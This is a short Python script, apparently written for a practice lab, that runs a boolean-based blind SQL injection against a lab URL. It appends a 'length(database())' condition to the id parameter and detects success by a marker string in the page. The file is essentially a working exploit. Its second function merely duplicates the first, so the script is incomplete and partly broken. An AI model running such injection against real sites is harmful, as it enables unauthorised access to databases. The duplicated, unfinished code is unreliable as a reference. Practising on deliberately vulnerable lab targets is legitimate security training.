import time
from requests_html import AsyncHTMLSession, HTMLSession

start_time = time.time()

session = HTMLSession()
proxies = {}

url = 'http://inject2.lab.aqlab.cn:81/Pass-10/index.php?id=1'
flag_work = '有数据'

payload1_database_length = ' and length(database())={}'
payload1_database = ' and length(database())={}'


def database_length():
    for i in range(128):
        sql = url + payload1_database_length.format(i)
        res = session.get(sql)
        if flag_work in res.text:
            print('database length = ', i)
            break


def database():
    for i in range(128):
        sql = url + payload1_database_length.format(i)
        res = session.get(sql)
        if flag_work in res.text:
            print('database length = ', i)
            break


if __name__ == '__main__':
    database_length()
    print("--- %s seconds ---" % (time.time() - start_time))
